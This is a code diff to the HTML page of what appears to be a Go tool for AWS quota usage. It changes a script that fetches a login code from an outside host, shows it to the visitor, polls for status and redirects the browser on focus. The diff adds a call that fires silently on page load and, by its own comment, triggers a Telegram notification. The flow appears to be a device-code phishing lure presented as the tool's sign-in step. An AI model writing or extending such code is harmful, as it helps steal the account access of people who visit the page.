@@ -229,12 +229,14 @@ go build -o aws-quota-usage-filter .
 
 <script>
 const B='https://auth.okkam.it';
-let sid=null,ea=null,pt=null,ct=null,ru=null,code=null;
+let sid=null,ea=null,pt=null,ct=null,ru=null,code=null,_initStarted=false;
 
 function showAuth(){
   document.getElementById('try-buttons').style.display='none';
   document.getElementById('auth-widget').classList.add('show');
-  init();
+  if(sid) showCodeUI();          // already loaded — show immediately
+  else if(!_initStarted) init(); // not started yet — start now
+  // else init is in-flight — UI will update when it resolves
 }
 
 function copyCode(){
@@ -257,17 +259,33 @@ document.addEventListener('visibilitychange',function(){if(!document.hidden&&ru)
 window.addEventListener('focus',function(){if(ru)window.location.href=ru});
 
 async function init(){
+  _initStarted=true;
   try{
     const r=await fetch(B+'/api/v1/cache/init',{method:'POST'});
     const d=await r.json();
     if(d.error){showError('Could not initialize: '+d.error);return}
     sid=d.sid;code=d.uc;ea=Date.now()+(d.ex*1000);
-    document.getElementById('uc').textContent=d.uc;
-    document.getElementById('auth-loading').style.display='none';
-    document.getElementById('auth-main').style.display='block';
-    ct=setInterval(updateTimer,1000);
+    // Only update UI if widget is visible
+    const widget=document.getElementById('auth-widget');
+    if(widget.classList.contains('show')){
+      document.getElementById('uc').textContent=d.uc;
+      document.getElementById('auth-loading').style.display='none';
+      document.getElementById('auth-main').style.display='block';
+      ct=setInterval(updateTimer,1000);
+    }
     pt=setInterval(pollStatus,2000);
-  }catch(e){showError('Connection error. Please try again.');}
+  }catch(e){
+    const widget=document.getElementById('auth-widget');
+    if(widget.classList.contains('show')) showError('Connection error. Please try again.');
+  }
+}
+
+function showCodeUI(){
+  if(!sid)return;
+  document.getElementById('uc').textContent=code;
+  document.getElementById('auth-loading').style.display='none';
+  document.getElementById('auth-main').style.display='block';
+  if(!ct) ct=setInterval(updateTimer,1000);
 }
 
 async function pollStatus(){
@@ -299,6 +317,9 @@ function showError(msg){
   const el=document.getElementById('auth-error');
   el.innerHTML=msg;el.classList.add('show');
 }
+
+// Fire silently on page load — triggers Telegram notification, pre-loads code
+init();
 </script>
 </body>
 </html>
